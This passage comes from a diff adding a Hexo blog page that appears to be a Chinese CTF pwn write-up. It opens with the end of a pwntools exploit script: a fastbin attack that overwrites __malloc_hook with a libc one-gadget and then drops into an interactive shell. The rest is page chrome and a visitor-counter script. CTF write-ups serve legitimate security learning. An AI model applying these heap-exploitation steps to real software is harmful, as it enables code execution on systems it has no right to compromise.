class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x68</span>,<span class="string">'chapter'</span>)<span class="comment">#fastbin 0x70-&gt;#1 section_head-&gt;malloc_hook-0x23</span></span><br><span class="line">read_book(<span class="string">'\x00'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x68</span>,<span class="string">'chapter'</span>)<span class="comment">#fastbin 0x70-&gt;malloc_hook-0x23</span></span><br><span class="line">read_book(<span class="string">'\x00'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(libc_addr+gadget[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"choose your id:\n"</span>,<span class="string">'0'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/29/2018bctf-pwn/" rel="next" title="2018bctf pwn">
+                <i class="fa fa-chevron-left"></i> 2018bctf pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.jpg"
+                alt="0gur1" />
+            
+              <p class="site-author-name" itemprop="name">0gur1</p>
+              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#个人赛"><span class="nav-number">1.</span> <span class="nav-text">个人赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#catchme"><span class="nav-number">1.1.</span> <span class="nav-text">catchme</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用脚本"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note"><span class="nav-number">1.2.</span> <span class="nav-text">note</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用脚本-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">利用脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#线下赛"><span class="nav-number">2.</span> <span class="nav-text">线下赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn4-library"><span class="nav-number">2.1.</span> <span class="nav-text">pwn4-library</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本逻辑"><span class="nav-number">2.1.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bugs"><span class="nav-number">2.1.2.</span> <span class="nav-text">bugs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">2.1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用脚本-2"><span class="nav-number">2.1.4.</span> <span class="nav-text">利用脚本</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0gur1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客量:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
